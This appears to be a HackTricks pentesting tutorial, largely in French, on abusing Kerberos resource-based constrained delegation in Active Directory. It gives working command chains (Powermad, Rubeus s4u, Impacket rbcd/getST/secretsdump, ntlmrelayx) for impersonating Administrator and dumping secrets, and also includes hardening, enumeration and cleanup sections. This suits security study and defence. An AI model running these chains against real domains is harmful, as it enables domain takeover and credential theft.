# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Principes de base de la Resource-based Constrained Delegation

Cela est similaire à la [Constrained Delegation](constrained-delegation.md) de base, mais **au lieu** d’accorder à un **objet** les permissions nécessaires pour **usurper l’identité de n’importe quel utilisateur auprès d’une machine**, la Resource-based Constrain Delegation **définit**, dans **l’objet**, qui est autorisé à usurper l’identité de n’importe quel utilisateur auprès de celui-ci.<sup>[[12]](#references)</sup>

Dans ce cas, l’objet contraint possède un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_, contenant le nom de l’utilisateur qui peut usurper l’identité de n’importe quel autre utilisateur auprès de celui-ci.

Une autre différence importante entre cette Constrained Delegation et les autres délégations est que tout utilisateur disposant de **permissions d’écriture sur un compte machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (dans les autres formes de Delegation, les privilèges de domain admin étaient nécessaires).<sup>[[1]](#references)</sup>

### Nouveaux concepts

Dans la Constrained Delegation, il était indiqué que le flag **`TrustedToAuthForDelegation`** à l’intérieur de la valeur _userAccountControl_ de l’utilisateur était nécessaire pour effectuer un **S4U2Self.** Mais ce n’est pas complètement vrai.\
En réalité, même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n’importe quel utilisateur si vous êtes un **service** (vous disposez d’un SPN), mais si vous **avez `TrustedToAuthForDelegation`**, le TGS renvoyé sera **Forwardable** et si vous ne possédez **pas** ce flag, le TGS renvoyé ne sera **pas** **Forwardable**.

Cependant, si le **TGS** utilisé dans **S4U2Proxy** n’est **PAS Forwardable**, une tentative d’abus d’une **basic Constrain Delegation** **ne fonctionnera pas**. En revanche, si vous essayez d’exploiter une **Resource-Based constrain delegation**, cela fonctionnera.<sup>[[1]](#references)[[2]](#references)</sup>

### Structure de l’attaque

> Si vous disposez de **privilèges équivalents à des permissions d’écriture** sur un compte **Computer**, vous pouvez obtenir un **accès privilégié** à cette machine.

Supposons que l’attaquant dispose déjà de **privilèges équivalents à des permissions d’écriture sur l’ordinateur victime**.

1. L’attaquant **compromet** un compte qui possède un **SPN** ou **en crée un** (« Service A »). Notez que tout _Admin User_ sans autre privilège particulier peut **créer** jusqu’à 10 objets Computer (**_MachineAccountQuota_**) et leur définir un **SPN**. L’attaquant peut donc simplement créer un objet Computer et lui définir un SPN.
2. L’attaquant **abuse de son privilège WRITE** sur l’ordinateur victime (ServiceB) pour configurer une resource-based constrained delegation afin d’autoriser ServiceA à usurper l’identité de n’importe quel utilisateur auprès de cet ordinateur victime (ServiceB).
3. L’attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A vers Service B pour un utilisateur disposant d’un **accès privilégié à Service B**.
1. S4U2Self (depuis le compte compromis/créé avec le SPN) : demander un **TGS d’Administrator vers moi** (Not Forwardable).
2. S4U2Proxy : utiliser le **TGS not Forwardable** de l’étape précédente pour demander un **TGS** d’**Administrator** vers l’**hôte victime**.
3. Même si vous utilisez un TGS not Forwardable, puisque vous exploitez une Resource-based constrained delegation, cela fonctionnera.
4. L’attaquant peut effectuer un **pass-the-ticket** et **usurper l’identité** de l’utilisateur afin d’obtenir un **accès au ServiceB victime**.<sup>[[1]](#references)</sup>

Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d’un objet ordinateur

Vous pouvez créer un objet ordinateur dans le domaine à l’aide de **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuration de la délégation contrainte basée sur les ressources

**Using activedirectory PowerShell module**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Avec powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Effectuer une attaque S4U complète (Windows/Rubeus)

Tout d'abord, nous avons créé le nouvel objet Computer avec le mot de passe `123456`, nous avons donc besoin du hash de ce mot de passe :<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela imprimera les hashes RC4 et AES de ce compte.\
Maintenant, l'attaque peut être effectuée :<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer davantage de tickets pour davantage de services en effectuant une seule demande à l’aide du paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Notez que les utilisateurs possèdent un attribut appelé "**Cannot be delegated**". Si cet attribut est défini sur True pour un utilisateur, vous ne pourrez pas usurper son identité. Cette propriété est visible dans bloodhound.

### Outillage Linux : RBCD de bout en bout avec Impacket (2024+)

Si vous opérez depuis Linux, vous pouvez effectuer l'ensemble de la chaîne RBCD à l'aide des outils officiels d'Impacket :<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
- Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
- Impacket can rewrite the `sname` ("AnySPN") for some tools, but obtain the correct SPN whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD inter-domaines et inter-forêts

If the **delegating principal** you control lives in a **different domain** (or even a **different forest**) than the **resource computer**, the abuse is still **RBCD**, but the ticket flow is no longer the usual single-domain `S4U2Self -> S4U2Proxy`.

### RBCD inter-domaines : configurer le principal étranger par SID

When you set `msDS-AllowedToActOnBehalfOfOtherIdentity` from a **different domain**, the foreign machine/user might **not be resolvable by name** in the target domain LDAP. In that case, configure the delegation entry using the **SID** of the foreign principal instead of its sAMAccountName/UPN.

This is especially relevant when relaying NTLM to LDAP with `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes :
- `--sid` indique à `ntlmrelayx.py` de traiter `--escalate-user` comme un SID, ce qui est requis lorsque le compte délégant est étranger au domaine cible.
- Même si l'outil affiche `User not found in LDAP`, l'écriture de la délégation peut tout de même réussir, car le security descriptor stocke directement le SID étranger.

### RBCD cross-domain : séquence S4U cross-realm

Une fois que le principal étranger se trouve dans `msDS-AllowedToActOnBehalfOfOtherIdentity`, le flux cross-domain fonctionnel est le suivant :<sup>[[9]](#references)[[13]](#references)</sup>

1. Obtenir un **TGT** pour le principal délégant depuis son propre domaine.
2. Demander un **referral TGT** pour `krbtgt/<target-domain>`.
3. Demander un **cross-realm S4U2Self referral** pour l'utilisateur usurpé auprès du DC du domaine cible.
4. Demander le ticket **S4U2Self** réel pour cet utilisateur dans le domaine délégant.
5. Effectuer **S4U2Proxy** dans le domaine délégant afin d'obtenir un ticket de referral pour le domaine cible.
6. Effectuer le **S4U2Proxy** final sur le DC du domaine cible afin d'obtenir le service ticket pour `cifs/host.target`, `host/host.target`, etc.

C'est pourquoi les outils Linux standards échouent souvent avec le RBCD cross-domain :<sup>[[9]](#references)</sup>
- le **realm** de la requête peut devoir être différent du realm du TGT utilisé dans le `TGS-REQ`
- la chaîne nécessite des étapes **S4U2Proxy indépendantes**, et pas uniquement **S4U2Self** ou **S4U2Self** immédiatement suivi d'un unique **S4U2Proxy**

### RBCD cross-domain depuis Linux

Synacktiv a publié une implémentation d'Impacket `getST.py` qui reproduit la séquence cross-realm depuis Linux en gérant explicitement les deux KDC :<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Sur le plan opérationnel, les nouveaux arguments sont :
- `-dc-ip` : DC du domaine **delegating**
- `-targetdomain` : domaine de l’ordinateur **resource**
- `-targetdc` : DC du domaine **resource**

### Limitations de RBCD cross-forest

La RBCD cross-forest présente une limitation importante : **l’utilisateur usurpé doit appartenir à la même forêt que le principal delegating**. Autrement dit, si votre machine account contrôlé se trouve dans `valhalla.local` et que la ressource cible se trouve dans `asgard.local`, vous ne pouvez généralement **pas usurper arbitrairement des utilisateurs `asgard.local`** auprès de cette ressource via RBCD.<sup>[[9]](#references)</sup>

Cela reste exploitable lorsque :
- l’utilisateur de la **forêt delegating** est **local admin** (ou dispose autrement de privilèges) sur l’hôte resource de l’autre forêt
- une trust autorise le chemin d’authentification requis et le SID étranger est accepté dans le security descriptor de l’ordinateur cible

### Particularités du protocole RBCD cross-forest

La RBCD cross-forest ne consiste pas simplement à faire du « cross-domain avec une trust ». Le flux observé présente deux particularités que les outils courants ne prennent historiquement pas en charge :<sup>[[9]](#references)</sup>

1. Une requête **S4U2Proxy** supplémentaire qui définit **`PA-PAC-OPTIONS=branch-aware`**
2. Un ticket de service final qui peut être renvoyé en **RC4**, même lorsque d’autres etypes ont été demandés

Le flux pratique est le suivant :

1. Obtenir un TGT pour le principal delegating dans la forêt A.
2. Demander un **S4U2Self** pour l’utilisateur usurpé dans la forêt A.
3. Demander un **S4U2Proxy** dans la forêt A afin d’obtenir un TGT de referral pour la forêt B.
4. Envoyer un second **S4U2Proxy** dans la forêt A **sans le ticket S4U2Self comme ticket supplémentaire**, mais avec `branch-aware` activé, afin d’obtenir un autre TGT de referral pour la forêt B.
5. Demander éventuellement un ticket de service normal dans la forêt B pour le principal delegating (ce ticket n’est pas nécessaire pour l’abus final).
6. Utiliser les tickets de referral des étapes 3 et 4 pour demander le ticket **S4U2Proxy** final dans la forêt B, pour l’utilisateur de la forêt A usurpé, vers le SPN cible.

### RBCD cross-forest depuis Linux

La même branche Synacktiv d’Impacket ajoute un switch `-forest` pour cette logique :<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD récursif multi-domaines (3+ domaines)

Dans les **forêts multi-domaines**, **S4U2Self** et **S4U2Proxy** peuvent être **récursifs** au lieu de s'arrêter après une seule referral :

- **S4U2Self récursif** : le premier `S4U2Self` est envoyé au **domaine de l'utilisateur usurpé**, les sauts intermédiaires parent/enfant sont parcourus avec des referrals `TGS-REQ` normales pour `krbtgt/<REALM>`, puis le **`S4U2Self` final** est envoyé dans le **propre domaine du principal délégant**.
- Cela signifie que le simple fait de **détenir un TGT** pour un compte machine peut suffire à usurper l'identité d'un **administrateur d'un autre domaine de la même forêt** et à demander `cifs/host`, `host/host`, `wsman/host`, etc.
- **S4U2Proxy récursif** suit la chaîne d'approbations de la même manière : les sauts intermédiaires réutilisent le ticket précédent comme TGT tout en demandant la referral `krbtgt/<REALM>` suivante, et seul le dernier saut renvoie le ticket de service final.<sup>[[10]](#references)</sup>

Un exemple pratique dans une même forêt est :
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD cross-domain / cross-forest sans SPN

Si le **principal délégant est un utilisateur sans SPN**, le dernier `S4U2Self` récursif échoue avec **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Le contournement consiste à **réessayer uniquement le dernier hop avec `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Version courte de la chaîne d’abus :

1. S’authentifier avec le **hash NT** afin de pousser le KDC vers **RC4-HMAC (etype 23)**.
2. Demander d’abord **`-self -u2u`** et conserver ce ticket séparément de l’étape proxy ultérieure.
3. Extraire la clé de session du **TGT** avec `describeTicket.py`.
4. Remplacer le **hash NT** de l’utilisateur par cette **clé de session** avec `changepasswd.py -newhashes <session_key>`.
5. Réutiliser le ticket **`S4U2Self+U2U`** comme **`-additional-ticket`** lors d’une requête **`-proxy`** séparée.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Précautions opérationnelles :

- Lorsque le **premier trusted hop est déjà une autre forest**, préférez l’algorithme **branch-aware** (`getST.py ... -forest`) afin de reproduire le comportement natif de Windows. Si la foreign forest n’est atteinte que plus tard dans la chaîne, le flux récursif non branch-aware peut encore fonctionner.<sup>[[9]](#references)</sup>
- Sur les DC **Windows Server 2022/2025** récents, le RC4 forcé peut échouer avec **`KDC_ERR_ETYPE_NOSUPP`** en raison de l’obsolescence de RC4 ; cela peut rendre le **SPN-less RBCD** impossible, même si le RBCD classique basé sur un SPN fonctionne toujours avec AES.<sup>[[15]](#references)</sup>
- Exécutez **`S4U2Self+U2U` avant de modifier le hash/mot de passe de l’utilisateur** : `SamrChangePasswordUser` ne recalcule pas les clés AES Kerberos du compte ; effectuer le changement de mot de passe en premier peut donc interrompre les demandes de tickets ultérieures.<sup>[[14]](#references)</sup>
- Le compte usurpé doit toujours être **délégable** : **Protected Users** et les comptes avec **`NOT_DELEGATED`** / **« Account is sensitive and cannot be delegated »** bloquent la chaîne.

## Notes de détection / hardening

- Les chemins RBCD entre domaines/forests sont encore généralement créés via un **abus d’ACL** ou un **relay-to-LDAP**. Imposer la **signature LDAP** et le **LDAP channel binding** sur les DC afin de bloquer les chemins de mise en place courants.
- Auditez les personnes pouvant écrire `msDS-AllowedToActOnBehalfOfOtherIdentity` sur les objets ordinateur et résolvez les SID enregistrés, y compris les **foreign security principals**.
- Dans les environnements fortement dépendants des trusts, examinez la **Selective Authentication**, le **SID filtering** et déterminez si des utilisateurs provenant d’une foreign forest disposent de droits **local admin** sur les hôtes hébergeant les ressources.

### Accès

La dernière ligne de commande effectuera la **complete S4U attack et injectera le TGS** d’Administrator vers l’hôte victime en **mémoire**.\
Dans cet exemple, un TGS a été demandé pour le service **CIFS** d’Administrator ; vous pourrez donc accéder à **C$** :
```bash
ls \\victim.domain.local\C$
```
### Abuser différents service tickets

Découvrez les [**service tickets disponibles ici**](silver-ticket.md#available-services).

## Énumération, audit et nettoyage

### Énumérer les ordinateurs avec RBCD configuré

PowerShell (décodage du SD pour résoudre les SID) :
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lire ou vider avec une seule commande) :
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Nettoyage / réinitialisation de RBCD

- PowerShell (effacer l’attribut) :
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erreurs Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`** : Cela signifie que Kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous fournissez uniquement le hash RC4. Fournissez à Rubeus au moins le hash AES256 (ou fournissez-lui simplement les hashs rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** pendant `-self` pour un utilisateur normal : le principal déléguant n'a probablement **aucun SPN**. Réessayez le **dernier hop** avec **`S4U2Self+U2U`** au lieu d'un `S4U2Self` standard.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** pendant un **SPN-less RBCD** : les DC récents peuvent rejeter le chemin **RC4-HMAC** forcé requis par l'astuce **`S4U2Self+U2U` + substitution de clé de session**. Essayez plutôt un chemin RBCD classique **SPN-backed** avec AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`** : Cela signifie que l'heure de l'ordinateur actuel est différente de celle du DC et que Kerberos ne fonctionne pas correctement.
- **`preauth_failed`** : Cela signifie que le nom d'utilisateur et les hashs fournis ne fonctionnent pas pour se connecter. Vous avez peut-être oublié de placer le caractère "$" dans le nom d'utilisateur lors de la génération des hashs (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** : Cela peut signifier :
- L'utilisateur que vous essayez d'usurper ne peut pas accéder au service souhaité (parce que vous ne pouvez pas l'usurper ou parce qu'il ne dispose pas de privilèges suffisants)
- Le service demandé n'existe pas (si vous demandez un ticket pour WinRM alors que WinRM ne fonctionne pas)
- Le fakecomputer créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui rendre.
- Vous abusez de KCD classique ; rappelez-vous que RBCD fonctionne avec des tickets S4U2Self non forwardable, tandis que KCD nécessite des tickets forwardable.

## Notes, relays et alternatives

- Vous pouvez également écrire le RBCD SD via les Active Directory Web Services (ADWS) si LDAP est filtré. Voir :


{{#ref}}
adws-enumeration.md
{{#endref}}

- Les chaînes de Kerberos relay se terminent fréquemment par un RBCD afin d'obtenir SYSTEM local en une seule étape. Voir les exemples pratiques de bout en bout :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si la signature LDAP et le channel binding sont **désactivés** et que vous pouvez créer un compte machine, des outils comme **KrbRelayUp** peuvent relayer une authentification Kerberos forcée vers LDAP, définir `msDS-AllowedToActOnBehalfOfOtherIdentity` pour votre compte machine sur l'objet ordinateur cible, puis usurper immédiatement **Administrator** via S4U depuis l'extérieur de l'hôte.<sup>[[8]](#references)</sup>

## Références

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
